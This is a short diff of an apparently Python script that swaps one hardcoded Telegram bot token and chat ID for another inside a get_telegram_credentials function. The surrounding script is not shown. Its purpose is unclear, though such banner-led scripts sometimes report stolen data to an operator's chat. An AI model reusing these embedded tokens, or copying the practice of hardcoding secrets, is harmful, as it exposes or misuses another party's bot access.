@@ -64,8 +64,8 @@ def banner():
 
 def get_telegram_credentials():
     try:
-        bot_token = "6600226252:AAGE6R5C8EtNlX6nYYApgvvEpZwHwSEeqeE"
-        chat_id = "5467733106"
+        bot_token = "8144749994:AAEp0yAZVxGST2Wn16WTep7JlDon45Yybqw"
+        chat_id = "7453226176"
         return bot_token, chat_id
     except:
         return None, None
